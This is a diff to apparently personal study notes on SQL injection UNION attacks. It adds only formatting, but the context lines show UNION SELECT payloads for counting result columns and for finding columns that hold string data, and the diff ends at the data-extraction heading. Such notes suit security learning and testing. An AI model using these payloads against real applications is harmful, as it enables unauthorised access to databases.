@@ -1,5 +1,8 @@
 # Methodology for SQL injection UNION attacks
+#METHODOLOGY 
 #UNION 
+
+<hr>
 
 ## 1. Determine the number of columns of the result set 
 
@@ -33,6 +36,8 @@ It's necessary to always select from a table, use the built-in `dual` table.
 ' UNION SELECT NULL,NULL,NULL FROM dual--
 ```
 
+<hr>
+
 ## 2. Determine which columns of the result set can hold string data
 
 Use the following payload  checking the application's response to get information form errors about the data type or if it prompts no errors it indicates the column can hold string data.
@@ -51,6 +56,8 @@ Use the following payload  checking the application's response to get informatio
 ' UNION SELECT 'a',NULL FROM dual--
 ' UNION SELECT NULL,'a' FROM dual--
 ```
+
+<hr>
 
 ## 3. Extract data
 
